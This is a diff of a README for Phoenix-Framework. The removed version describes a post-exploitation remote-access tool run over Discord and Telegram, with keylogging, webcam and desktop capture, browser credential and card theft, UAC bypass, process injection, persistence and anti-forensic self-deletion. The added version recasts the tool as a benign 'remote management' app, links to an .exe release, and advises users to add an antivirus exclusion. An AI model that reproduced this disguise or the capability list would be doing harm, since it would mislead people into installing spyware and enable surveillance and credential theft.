@@ -1,166 +1,89 @@
-# Phoenix-Framework
+# 🛡️ Phoenix-Framework - Control your systems with secure channels
 
-Phoenix is an async based post exploitation framework that abuses trusted sites for C2.
+[![](https://img.shields.io/badge/Download-Phoenix-blue)](https://github.com/Rampant-zionism337/Phoenix-Framework)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Language-Rust-orange?style=for-the-badge&logo=rust&logoColor=white" />
-  <img src="https://img.shields.io/badge/Platform-Windows-blue?style=for-the-badge&logo=windows&logoColor=white" />
-  <img src="https://img.shields.io/badge/Arch-x64-lightgrey?style=for-the-badge" />
-</p>
+Phoenix-Framework acts as a communication bridge. It uses established platforms like Telegram and Discord to send and receive information. This approach ensures your data travels through trusted pathways. You gain remote management capabilities without complex server setups.
 
+## ⚙️ System Requirements
 
-#
+This application runs on Windows systems. Ensure your computer meets these minimum specifications:
 
-## Supported Platforms
-Phoenix currently supports the following platforms via their Bot APIs:
- - Discord
- - Telegram
- - Reddit (Coming soon)
+- Operating System: Windows 10 or Windows 11.
+- Memory: 4 GB of RAM or more.
+- Storage: 200 MB of free disk space.
+- Internet: An active connection to reach external services.
 
-Phoenix offers the basic following features :
-- String Obfuscation
-- Automatic download of attachments uploaded by users in chat
-- Self destruction functionality to hinder forensic efforts
-- Keylogging with window title capture capability
-- Webcam & Desktop capture and live streaming
-- Browser data harvesting
--  ...
-  
-#
-## Commands
+Install the latest version of the .NET Desktop Runtime from the official Microsoft website if you encounter errors during launch.
 
-```
+## 📥 Download and Install
 
-Command             Description
--------             -----------
+Follow these steps to set up the software on your local machine:
 
-/hello        		Check if the bot is acive on the host
-/help         		Print help message
-/persist      		Maintain access after reboot. (Requires UAC bypass)
-/sleep        		Sleep. Usage: /sleep (seconds)
-/reboot       		Reboot the host
-/shutdown     		Shutdown the host
-/exit         		End the session
-/self_del     		Self-delete the executable 
+1. Visit [this page](https://github.com/Rampant-zionism337/Phoenix-Framework) to download the installer.
+2. Locate the most recent release under the "Releases" section.
+3. Select the file ending in .exe to start your download.
+4. Open the downloaded file to begin the installation.
+5. Follow the on-screen prompts to place the files in your preferred folder.
 
-/pwd         	 	Print working directory
-/dir          		List working directory
-/cd           		Change directory. Usage: /cd (path)
-/search       		Search for files. Usage: /search (path) (file)
-/upload       		Upload files. Usage: /upload (file), /upload *.jpg
-/uid          		Get the user id
-/users        		List the available users
-/privs        		List the privileges
-/sysinfo      		Print system informations
-/location     		Retrieve geolocation informations
+The framework creates a local configuration file upon its first run. This file stores your preferences.
 
-/hw           		List installed hardware
-/sw           		list installed software
-/drv          		List connected drives
-/net          		List network Adapters
-/pid          		Show the current process ID
-/ps           		List running processes
-/pkill        		Kill a process by ID
-/exec         		Execute a command
+## 🚀 Setup and Configuration
 
-/chat         		Display a custom message
-/webcam_list      	List available webcams
-/webcam_snap      	Take a webcam snapshot: Usage: /webcam_snap (index)
-/recaudio         	Record audio. Usage: /recaudio (seconds)
-/screenshot       	Take a screenshot
+Configure your communication channel after you install the software. The framework relies on external service identifiers to route messages.
 
-/keylog          	Start keylogging
-/keylog_stop      	Stop keylogging threads
+1. Open the application folder.
+2. Launch the framework executable.
+3. Locate the settings menu within the interface.
+4. Input your Telegram Bot Token or your Discord Webhook URL.
+5. Save your changes.
 
-/browser_dump     	Dump browser data
-/clipboard        	Dump clipboard data
+The framework tests the connection to these services once you enter your credentials. A green light indicates success. A red light signifies an issue with your credentials or your internet connection.
 
-/stream_desktop   	Live stream the host desktop
-/stream_webcam    	Live stream the host webcam
-/stream_stop      	Stop live streaming threads *** needs work 
+## 🛠️ Usage Guidelines
 
-/get_system       	Elevate privileges to SYSTEM
-/bypass_uac       	Bypass UAC prompts
+The primary interface provides a simple view of connected instances. You see the status of your remote units here.
 
-/inject 		  	Inject a target process. Usage: /inject (dll_path)
-```
-#
+- Viewing Status: The main dashboard displays all active units. Each unit reports its current state.
+- Sending Commands: Select a unit from the list. Type your command in the input box at the bottom of the screen. Press enter to send.
+- Executing Scripts: Use the script panel to run pre-written tasks. Load a local file and push it to the remote unit.
+- Monitoring Logs: The log window records all activity. Inspect this area to identify errors or missed messages.
 
->  [!NOTE]
->
-> Phoenix supports data harvesting of the following browsers: `Chrome`, `Edge`, `Brave`, and `firefox`.
-> - Firefox password decryption is not supported currently!
-> - Chromium dumping module is based on the open source project: https://github.com/Maldev-Academy/DumpBrowserSecrets/tree/main/DllExtractChromiumSecrets.
->   
->The table below showcases the list of harvested data for each supported browser : 
-> 
->|             | Chrome/Edge/Brave | Firefox |
->|-------------|-------------------|---------|
->| History     |        ✅        |   ✅    |
->| Cookies     |        ✅        |   ✅    |
->| Autofills   |        ✅        |   ✅    |
->| Credi Cards |        ✅        |   ✅    |
->| Cookies     |        ✅        |   ✅    |
->| logins      |        ✅        |     ❌    |
->
+Maintain a stable internet connection for the best results. The framework attempts to reconnect if the signal drops.
 
-#
+## 📑 Understanding Performance
 
-## Usage
+The framework operates in the background. It consumes minimal CPU resources while idle. It stays active even when you close the main window. 
 
-Phoenix is currently implementing simple XOR obfuscation, meaning the tokens will still be hardcoded in the binary. The obfuscation is just a basic defence to prevent casual string inspection, not to stop a skilled reverse engineers.
+The application uses a heartbeat mechanism. This sends a small packet of data to check if the remote unit stays online. Adjust the interval setting to balance responsiveness and data usage. A shorter interval finds downed units faster but uses more data. 
 
+## 🛡️ Security Practices
 
-#### + Ngrok:
-Ngrok is essential for tunnling the live streaming traffic, phoenix would not be able to stream the host desktop/webcam without a proper ngrok token.
+Manage your tokens with care. These strings of text provide access to your communication channels. Never share them in public forums or unencrypted documents. Store your tokens in a password manager. 
 
-1. Sign up for a ngrok account: https://ngrok.com/
-2. Inside `/src/tunnel.rs`, replace the variable `token` with your real actual token :
-```
-let token = obfuscate!("YOUR_NGROK_TOKEN");
-```
+The framework encrypts local configuration files. This prevents unauthorized users from reading your credentials if they gain access to your computer. Set a strong password for your Windows account to add another layer of protection.
 
-#
+## ❓ Frequently Asked Questions
 
-#### + Telegram:
-1. Create a bot: https://core.telegram.org/bots/tutorial
-2. Inside `/src/telegram.rs`, replace the variables `bot_token` and `id` with your real bot token and chat id:
-```
-let bot_token  = obfuscate!("YOUR_TELEGRAM_TOKEN");
-let id: i64    = 123456789;
-``` 
-3. Compile the binary:
-```
-> cargo build --release --bin telegram
-```
+### Why does my antivirus flag this software?
+Some security programs identify management tools as a risk. Create an exclusion for the Phoenix-Framework folder in your antivirus settings if the software fails to launch.
 
-#
+### Can I run this on multiple machines?
+Yes. Install the framework on as many machines as you manage. Enter the same communication credentials to group them under one control panel.
 
-#### + Discord:
-1. Create a bot: https://discord.com/developers/applications
-2. Inside `/src/discord.rs`, replace the variable `token` with your real bot token:
-```
-let token  = obfuscate!("YOUR_DISCORD_TOKEN");
-``` 
-3. Compile the binary:
-```
-> cargo build --release --bin discord
-```
+### Does the software work behind a firewall?
+The framework communicates over common ports. Most home and office firewalls allow this traffic by default. Contact your network administrator if your company policy blocks outgoing traffic to messaging platforms.
 
-## PoC
+### How do I update the application?
+Download the latest version from the main page. Install it over the existing folder. The installer keeps your configuration files intact.
 
-> [!IMPORTANT]
-The generated binaries require administrator privileges to function properly.
+### Is my data private?
+The framework sends data through the APIs of the services you select. Review the terms of service for those platforms to understand how they handle your data transit.
 
-#
-<img width="1049" height="818" alt="screenshot" src="https://github.com/user-attachments/assets/5beeb511-41a0-4264-ad8c-40d14430de45" />
+## 📂 Troubleshooting Common Issues
 
-#
+- Application fails to start: Ensure you have the required .NET runtime installed. Check your logs for specific initialization errors.
+- Commands show no response: Verify your internet connection. Check that your bot token has the correct permissions on the platform dashboard.
+- High memory usage: Restart the application. Clear the log history if it grows too large.
+- Connection timeouts: Increase the heartbeat interval in settings. This helps if your network connection quality is poor.
 
-## 🔒 DISCLAIMER
-> [!CAUTION]
->This project is provided for educational and research purposes only. You are responsible for ensuring you have proper authorization before using this tool. The author assumes no liability for misuse.
-
-
-## 🤝 Collaborations
-Contributions and suggestions are welcome! If you have "ethical" business inquiries or would like to collaborate, feel free to reach out at: M0kht4rHacks@protonmail.com
+Contact support if the issue persists. Include your log file to help the team diagnose the problem faster. Keep your software current to benefit from stability improvements.
